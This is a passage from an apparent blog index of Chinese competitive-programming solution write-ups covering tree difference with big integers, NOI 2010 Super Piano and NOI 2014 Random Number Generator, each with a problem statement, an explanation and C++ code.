class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;n, &amp;k);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n - <span class="number">1</span>; i++) &#123;</span><br><span class="line">        <span class="type">int</span> s, t;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;s, &amp;t);</span><br><span class="line">        <span class="built_in">addEdge</span>(s, t);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;N[i].f[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">dp1</span>(&amp;N[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">dp2</span>(&amp;N[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= k; j++) ans += N[i].f[j];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, ans);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>DP</tag>
        <tag>数学</tag>
        <tag>组合数学</tag>
        <tag>树形 DP</tag>
        <tag>换根</tag>
        <tag>2012</tag>
        <tag>洛谷</tag>
        <tag>USACO</tag>
        <tag>容斥原理</tag>
      </tags>
  </entry>
  <entry>
    <title>「牛客 CSP-S 模拟赛」躲避技能 - 树上差分 + 贪心 + 高精度</title>
    <url>/nc-40646a/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a
href="https://ac.nowcoder.com/acm/contest/40646/A">牛客链接（需付费）</a></p>
<p>鸡尾酒是一个多操手，他可以同时操作 <span
class="math inline">\(m\)</span> 个账号。今天，他使用这些账号一起打一个
boss。这个 boss 战的地图共有 <span class="math inline">\(n\)</span>
个关键点，其中有 <span class="math inline">\(n - 1\)</span>
条边，每条边连接着两个不同的点，使得从任意点出发可以到达其他所有的点。鸡尾酒的
<span class="math inline">\(m\)</span> 个账号分别编号 <span
class="math inline">\(1\)</span> 至 <span
class="math inline">\(m\)</span>，一开始，第 <span
class="math inline">\(i\)</span> 个账号在点 <span
class="math inline">\(s_i\)</span>。<strong>可能有两个账号在同一位置</strong>。</p>
<p>现在，boss 放出了一个致命技能。boss 在地图上标出了 <span
class="math inline">\(m\)</span>
个关键点，想成功躲避这个技能，必须在每一个被标记的点上，都有一个账号站在上面。<strong>注意，可能会有点被多次标记，多次标记的点需要有多个账号站在上面</strong>。</p>
<p>由于鸡尾酒无法分身，所以
<strong>他必须先把一个账号移动到一个位置，才能动另一个账号，不能同时移动多个账号</strong>。假设鸡尾酒的任意账号通过第
<span class="math inline">\(i\)</span> 条边的时间为 <span
class="math inline">\(w_i\)</span>，请帮鸡尾酒求出他成功躲避技能所需要的最少时间。</p>
<p>数据范围：<span class="math inline">\(1 \le n, m \le
10^5\)</span>，<span class="math inline">\(1 \le w_i \le
10^{100}\)</span>。</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>通过贪心分析题目性质，我们可以发现对于一颗子树，优先在子树中匹配是不劣的。因为两点仅有一条路径，且匹配到子树外必须经过根的边，于是优先在子树中匹配可尽量少走必须的边。这样我们就可以通过
DFS 得出方案。</p>
<p>考虑树上差分，我们对每个起点标记 <span
class="math inline">\(+1\)</span>，在每个终点标记 <span
class="math inline">\(-1\)</span>，从任一点开始 DFS
进行树上差分即可判断出在何时两点匹配。计算答案时只需将子树的答案加起来再加上未匹配的点经过边到达父亲所需的边权即可。由于
<span class="math inline">\(w_i\)</span> 过大，此题再写个高精即可。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">1e5</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">BigInt</span> &#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">const</span> <span class="type">int</span> MAXM = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">    std::vector&lt;<span class="type">int</span>&gt; v;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">BigInt</span>(<span class="type">const</span> <span class="type">int</span> n = <span class="number">0</span>) &#123; *<span class="keyword">this</span> = n; &#125;</span><br><span class="line"></span><br><span class="line">    BigInt &amp;<span class="keyword">operator</span>=(<span class="type">int</span> x) &#123;</span><br><span class="line">        v.<span class="built_in">clear</span>();</span><br><span class="line">        <span class="keyword">do</span> v.<span class="built_in">push_back</span>(x % <span class="number">10</span>); <span class="keyword">while</span> (x /= <span class="number">10</span>);</span><br><span class="line">        <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">BigInt &amp;<span class="title">read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="type">char</span> s[MAXN + <span class="number">1</span>];</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">        <span class="type">int</span> len = <span class="built_in">strlen</span>(s);</span><br><span class="line">        v.<span class="built_in">resize</span>(len);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; len; i++) v[i] = s[i] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = v.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, v[i]);</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">BigInt <span class="keyword">operator</span>+(<span class="type">const</span> BigInt &amp;a, <span class="type">const</span> BigInt &amp;b) &#123;</span><br><span class="line">    BigInt res;</span><br><span class="line">    res.v.<span class="built_in">clear</span>();</span><br><span class="line">    <span class="type">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; std::<span class="built_in">max</span>(a.v.<span class="built_in">size</span>(), b.v.<span class="built_in">size</span>()); i++) &#123;</span><br><span class="line">        <span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; a.v.<span class="built_in">size</span>()) t += a.v[i];</span><br><span class="line">        <span class="keyword">if</span> (i &lt; b.v.<span class="built_in">size</span>()) t += b.v[i];</span><br><span class="line">        <span class="keyword">if</span> (flag) t++, flag = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (t &gt;= <span class="number">10</span>) t -= <span class="number">10</span>, flag = <span class="literal">true</span>;</span><br><span class="line">        res.v.<span class="built_in">push_back</span>(t);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (flag) res.v.<span class="built_in">push_back</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BigInt &amp;<span class="keyword">operator</span>+=(BigInt &amp;a, <span class="type">const</span> BigInt &amp;b) &#123;</span><br><span class="line">    <span class="keyword">return</span> a = a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BigInt <span class="keyword">operator</span>*(<span class="type">const</span> BigInt &amp;a, <span class="type">const</span> BigInt &amp;b) &#123;</span><br><span class="line">    BigInt res;</span><br><span class="line">    res.v.<span class="built_in">resize</span>(a.v.<span class="built_in">size</span>() + b.v.<span class="built_in">size</span>() + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; a.v.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> j = <span class="number">0</span>; j &lt; b.v.<span class="built_in">size</span>(); j++) &#123;</span><br><span class="line">            res.v[i + j] += a.v[i] * b.v[j];</span><br><span class="line">            res.v[i + j + <span class="number">1</span>] += res.v[i + j] / <span class="number">10</span>;</span><br><span class="line">            res.v[i + j] %= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (res.v.<span class="built_in">size</span>() &gt; <span class="number">1</span> &amp;&amp; res.v.<span class="built_in">back</span>() == <span class="number">0</span>) res.v.<span class="built_in">pop_back</span>();</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">    std::vector&lt;<span class="keyword">struct</span> Edge&gt; adj;</span><br><span class="line">    <span class="type">int</span> cnt;</span><br><span class="line">&#125; N[MAXN + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Edge</span> &#123;</span><br><span class="line">    Node *s, *t;</span><br><span class="line">    BigInt w;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Edge</span>(Node *s, Node *t, BigInt w) : <span class="built_in">s</span>(s), <span class="built_in">t</span>(t), <span class="built_in">w</span>(w) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">addEdge</span><span class="params">(<span class="type">int</span> u, <span class="type">int</span> v, BigInt w)</span> </span>&#123;</span><br><span class="line">    N[u].adj.<span class="built_in">push_back</span>(<span class="built_in">Edge</span>(&amp;N[u], &amp;N[v], w));</span><br><span class="line">    N[v].adj.<span class="built_in">push_back</span>(<span class="built_in">Edge</span>(&amp;N[v], &amp;N[u], w));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">std::pair&lt;BigInt, <span class="type">int</span>&gt; <span class="title">dfs</span><span class="params">(Node *u, Node *fa = <span class="literal">nullptr</span>)</span> </span>&#123;</span><br><span class="line">    BigInt val = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> cnt = u-&gt;cnt;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (Edge e : u-&gt;adj) &#123;</span><br><span class="line">        <span class="keyword">if</span> (e.t == fa) <span class="keyword">continue</span>;</span><br><span class="line">        std::pair&lt;BigInt, <span class="type">int</span>&gt; res = <span class="built_in">dfs</span>(e.t, u);</span><br><span class="line">        res.first += std::<span class="built_in">abs</span>(res.second) * e.w;</span><br><span class="line">        val += res.first, cnt += res.second;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> std::<span class="built_in">make_pair</span>(val, cnt);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n, m;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; i++) &#123;</span><br><span class="line">        <span class="type">int</span> s;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;s);</span><br><span class="line">        N[s].cnt++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; i++) &#123;</span><br><span class="line">        <span class="type">int</span> t;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;t);</span><br><span class="line">        N[t].cnt--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="type">int</span> u, v;</span><br><span class="line">        BigInt w;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;u, &amp;v);</span><br><span class="line">        w.<span class="built_in">read</span>();</span><br><span class="line">        <span class="built_in">addEdge</span>(u, v, w);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">dfs</span>(&amp;N[<span class="number">1</span>]).first.<span class="built_in">print</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>2022</tag>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>图论</tag>
        <tag>树</tag>
        <tag>贪心</tag>
        <tag>树上差分</tag>
        <tag>牛客</tag>
        <tag>高精度</tag>
      </tags>
  </entry>
  <entry>
    <title>「NOI 2010」超级钢琴 - 贪心 + ST 表</title>
    <url>/noi2010-piano/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://www.luogu.com.cn/problem/P2048">洛谷链接</a></p>
<p>小 Z 是一个小有名气的钢琴家，最近 C 博士送给了小 Z 一架超级钢琴，小 Z
希望能够用这架钢琴创作出世界上最美妙的音乐。</p>
<p>这架超级钢琴可以弹奏出 <span class="math inline">\(n\)</span>
个音符，编号为 <span class="math inline">\(1\)</span> 至 <span
class="math inline">\(n\)</span>。第 <span
class="math inline">\(i\)</span> 个音符的美妙度为 <span
class="math inline">\(A_i\)</span>，其中 <span
class="math inline">\(A_i\)</span> 可正可负。</p>
<p>一个“超级和弦”由若干个编号连续的音符组成，包含的音符个数不少于 <span
class="math inline">\(L\)</span> 且不多于 <span
class="math inline">\(R\)</span>。我们定义超级和弦的美妙度为其包含的所有音符的美妙度之和。两个超级和弦被认为是相同的，当且仅当这两个超级和弦所包含的音符集合是相同的。</p>
<p>小 Z 决定创作一首由 <span class="math inline">\(k\)</span>
个超级和弦组成的乐曲，为了使得乐曲更加动听，小 Z 要求该乐曲由 <span
class="math inline">\(k\)</span>
个不同的超级和弦组成。我们定义一首乐曲的美妙度为其所包含的所有超级和弦的美妙度之和。小
Z 想知道他能够创作出来的乐曲美妙度最大值是多少。</p>
<p>数据范围：<span class="math inline">\(-1000 \leq A_i \leq
1000\)</span>，<span class="math inline">\(1 \leq L \leq R \leq
n\)</span> 且保证一定存在满足要求的乐曲。</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>由于各个超级和弦互不影响，我们可以考虑贪心地选取最大的几个超级和弦即为答案。</p>
<p>于是我们可以通过堆来维护最大的超级和弦。但由于 <span
class="math inline">\(l, r\)</span>
之间的范围过大，我们无法直接存储所有的超级和弦。</p>
<p>于是我们可以想到存储和弦的集合 <span class="math inline">\(S(i, l,
r)\)</span>，表示这个超级和弦从 <span class="math inline">\(i\)</span>
开始并在 <span class="math inline">\([l, r]\)</span>
结束。对于每个集合赋予权值为集合内的美妙度最大值。于是我们可将集合放在堆中进行排序。每次从堆中取出后，假设最大美妙度的和弦为
<span class="math inline">\((i, t)\)</span>，我们可以将这个集合拆分成
<span class="math inline">\(S(i, l, t - 1)\)</span> 和 <span
class="math inline">\(S(i, t + 1, r)\)</span>
两个集合并插入堆中。这样就相当于删除了 <span class="math inline">\((i,
t)\)</span> 这个和弦且不影响其他的和弦。像这样取出 <span
class="math inline">\(k\)</span> 个和弦即为答案。</p>
<p>对于和弦美妙度的计算，我们可以预处理前缀和，于是可得 <span
class="math inline">\((l, r)\)</span> 和弦的美妙度为 <span
class="math inline">\(s_r - s_{l - 1}\)</span>。在 <span
class="math inline">\(S(i, l, r)\)</span> 中取和弦的最大值只需计算 <span
class="math inline">\(\max\limits_{j \in [l, r]} s_{j}\)</span>
即可。这个过程需要使用 ST 表，我们只需预处理前缀和后对前缀和建立 ST
表即可。</p>
<p>时间复杂度为 <span class="math inline">\(O(n \log n)\)</span>。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">5e5</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> LOG_MAXN = <span class="number">19</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, k, l, r;</span><br><span class="line"><span class="type">int</span> a[MAXN + <span class="number">1</span>], s[MAXN + <span class="number">1</span>];</span><br><span class="line"><span class="type">int</span> f[MAXN + <span class="number">1</span>][LOG_MAXN + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">prepare</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) f[i][<span class="number">0</span>] = i;</span><br><span class="line">    <span class="type">int</span> t = <span class="built_in">log</span>(n) / <span class="built_in">log</span>(<span class="number">2</span>) + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt; t; j++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n - (<span class="number">1</span> &lt;&lt; j) + <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (s[f[i][j - <span class="number">1</span>]] &gt; s[f[i + (<span class="number">1</span> &lt;&lt; (j - <span class="number">1</span>))][j - <span class="number">1</span>]]) f[i][j] = f[i][j - <span class="number">1</span>];</span><br><span class="line">            <span class="keyword">else</span> f[i][j] = f[i + (<span class="number">1</span> &lt;&lt; (j - <span class="number">1</span>))][j - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">query</span><span class="params">(<span class="type">int</span> l, <span class="type">int</span> r)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> k = <span class="built_in">log</span>(r - l + <span class="number">1</span>) / <span class="built_in">log</span>(<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> (s[f[l][k]] &gt; s[f[r - (<span class="number">1</span> &lt;&lt; k) + <span class="number">1</span>][k]]) <span class="keyword">return</span> f[l][k];</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> f[r - (<span class="number">1</span> &lt;&lt; k) + <span class="number">1</span>][k];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">    <span class="type">int</span> i, l, r, t;</span><br><span class="line">    <span class="built_in">Node</span>(<span class="type">int</span> i, <span class="type">int</span> l, <span class="type">int</span> r) : <span class="built_in">i</span>(i), <span class="built_in">l</span>(l), <span class="built_in">r</span>(r), <span class="built_in">t</span>(<span class="built_in">query</span>(l, r)) &#123;&#125;</span><br><span class="line">    <span class="type">bool</span> <span class="keyword">operator</span>&lt;(<span class="type">const</span> Node &amp;o) <span class="type">const</span> &#123; <span class="keyword">return</span> s[t] - s[i - <span class="number">1</span>] &lt; s[o.t] - s[o.i - <span class="number">1</span>]; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d %d&quot;</span>, &amp;n, &amp;k, &amp;l, &amp;r);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) s[i] = s[i - <span class="number">1</span>] + a[i];</span><br><span class="line">    <span class="built_in">prepare</span>();</span><br><span class="line"></span><br><span class="line">    std::priority_queue&lt;Node&gt; q;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n - l + <span class="number">1</span>; i++) q.<span class="built_in">push</span>(<span class="built_in">Node</span>(i, i + l - <span class="number">1</span>, std::<span class="built_in">min</span>(n, i + r - <span class="number">1</span>)));</span><br><span class="line"></span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (k--) &#123;</span><br><span class="line">        Node u = q.<span class="built_in">top</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line">        ans += s[u.t] - s[u.i - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">if</span> (u.l &lt;= u.t - <span class="number">1</span>) q.<span class="built_in">push</span>(<span class="built_in">Node</span>(u.i, u.l, u.t - <span class="number">1</span>));</span><br><span class="line">        <span class="keyword">if</span> (u.t + <span class="number">1</span> &lt;= std::<span class="built_in">min</span>(n, u.r)) q.<span class="built_in">push</span>(<span class="built_in">Node</span>(u.i, u.t + <span class="number">1</span>, std::<span class="built_in">min</span>(n, u.r)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>, ans);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>数据结构</tag>
        <tag>贪心</tag>
        <tag>2010</tag>
        <tag>NOI</tag>
        <tag>ST 表</tag>
      </tags>
  </entry>
  <entry>
    <title>「NOI 2014」随机数生成器 - 贪心</title>
    <url>/noi2014-random/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://www.luogu.com.cn/problem/P2354">洛谷链接</a></p>
<p><a href="https://loj.ac/p/2248">LibreOJ 链接</a></p>
<p>小 H 最近在研究随机算法。随机算法往往需要通过调用随机数生成函数（例如
Pascal 中的 <span class="math inline">\(\texttt{random}\)</span> 和
C/C++ 中的 <span
class="math inline">\(\texttt{rand}\)</span>）来获得随机性。事实上，随机数生成函数也不是真正的「随机」，其一般都是按某个算法计算得来的。</p>
<p>比如，下面这个二次多项式递推算法就是一个常用算法：</p>
<p>算法选定非负整数 <span
class="math inline">\(x_0,a,b,c,d\)</span>，并采用如下公式递推进行计算。
<span class="math display">\[\forall i \geq 1,\
x_i=(ax_{i-1}^2+bx_{i-1}+c)\bmod d\]</span>
这样可以得到一个任意长度的非负整数 <strong>数列</strong> <span
class="math inline">\(\{x_i\}_{i \geq
1}\)</span>。一般说来，我们认为这个 <strong>数列</strong> 是随机的。</p>
<p>利用随机序列 <span class="math inline">\(\{x_i\}_{i \geq
1}\)</span>，我们还可以采用如下算法产生一个从 <span
class="math inline">\(1\)</span> 到 <span
class="math inline">\(K\)</span> 的 <strong>随机排列</strong> <span
class="math inline">\(\{T_i\}^K_{i \geq 1}\)</span>：</p>
<ol type="1">
<li>初始设 <span class="math inline">\(T\)</span> 为 <span
class="math inline">\(1 \sim K\)</span> 的递增序列；</li>
<li>对 <span class="math inline">\(T\)</span> 进行 <span
class="math inline">\(K\)</span> 次交换，第 <span
class="math inline">\(i\)</span> 次交换，交换 <span
class="math inline">\(T_i\)</span> 和 <span
class="math inline">\(T_{(x_i \bmod i)+1}\)</span> 的值。</li>
</ol>
<p>此外，小 H 在这 <span class="math inline">\(K\)</span>
次交换的基础上，又 <strong>额外</strong> 进行了 <span
class="math inline">\(Q\)</span> 次交换工作，对于第 <span
class="math inline">\(i\)</span> 次交换，小 H 会选定两个额外下标 <span
class="math inline">\(u_i\)</span> 和 <span
class="math inline">\(v_i\)</span>，并交换 <span
class="math inline">\(T_{u_i}\)</span> 和 <span
class="math inline">\(T_{v_i}\)</span> 的值。</p>
<p>为了检验这个随机生成算法的实用性，小 H 设计了如下问题：</p>
<p>小 H 有一个 <span class="math inline">\(N\)</span> 行 <span
class="math inline">\(M\)</span> 列的棋盘，她首先按照上述过程，通过
<span class="math inline">\(N\times M+Q\)</span> 次交换操作，生成一个
<span class="math inline">\(1 \sim N \times M\)</span> 的随机排列 <span
class="math inline">\(\{T_i\}^{N \times M}_{i \geq 1}\)</span>，然后将这
<span class="math inline">\(N \times M\)</span>
个数逐行逐列依次填入这个棋盘：也就是第 <span
class="math inline">\(i\)</span> 行第 <span
class="math inline">\(j\)</span> 列的格子上所填入的数应为 <span
class="math inline">\(T_{(i-1)M+j}\)</span>。</p>
<p>接着小 H
希望从棋盘的左上角，也就是第一行第一列的格子出发，<strong>每次向右走或向下走</strong>，在不走出棋盘的前提下，走到棋盘的右下角，也就是第
<span class="math inline">\(N\)</span> 行第 <span
class="math inline">\(M\)</span> 列的格子。</p>
<p>小 H 把所经过格子上的数字都记录了下来，并
<strong>从小到大排序</strong>，这样，对于任何一条合法的移动路径，小 H
都可以得到一个长度为 <span class="math inline">\(N+M-1\)</span>
的升序序列，我们称之为 <strong>路径序列</strong>。</p>
<p>小 H 想知道，她可能得到的 <strong>字典序最小</strong> 的
<strong>路径序列</strong> 应该是怎样的呢？</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>本题诈骗，实际上可直接模拟出 <span class="math inline">\(T\)</span>
序列，为使字典序最小，我们可以从 <span class="math inline">\(1\)</span>
到 <span class="math inline">\(n + m - 1\)</span>
的点权顺序遍历点，看目前遍历到的点是否可以加入到路径中。通过分析题目，我们可以很容易地得出对于每个被选用的点
<span class="math inline">\((x, y)\)</span>，则坐标位于 <span
class="math inline">\((x&#39; &lt; x, y&#39; &gt; y)\)</span> 与 <span
class="math inline">\((x&#39; &gt; x, y&#39; &lt; y)\)</span>
的点无法被选。于是我们可以记录每一行可选的坐标区间，然后每次更新答案的同时更新坐标区间即可。由于答案只有
<span class="math inline">\(n\)</span> 个数，时间复杂度为 <span
class="math inline">\(O(n^2)\)</span>。</p>
<p>本题略卡空间，每个点的坐标直接在线计算即可卡过。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">5000</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> x0, a, b, c, d;</span><br><span class="line">    <span class="type">int</span> n, m, q;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%lld %lld %lld %lld %lld&quot;</span>, &amp;x0, &amp;a, &amp;b, &amp;c, &amp;d);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d&quot;</span>, &amp;n, &amp;m, &amp;q);</span><br><span class="line"></span><br><span class="line">    <span class="function">std::vector&lt;<span class="type">int</span>&gt; <span class="title">t</span><span class="params">(n * m + <span class="number">1</span>)</span></span>;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> x = x0;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n * m; i++) &#123;</span><br><span class="line">        t[i] = i;</span><br><span class="line">        x = (a * x % d * x % d + b * x % d + c) % d;</span><br><span class="line">        std::<span class="built_in">swap</span>(t[i], t[x % i + <span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (q--) &#123;</span><br><span class="line">        <span class="type">int</span> u, v;</span><br><span class="line">        <span class="built_in">scanf</span>(<span 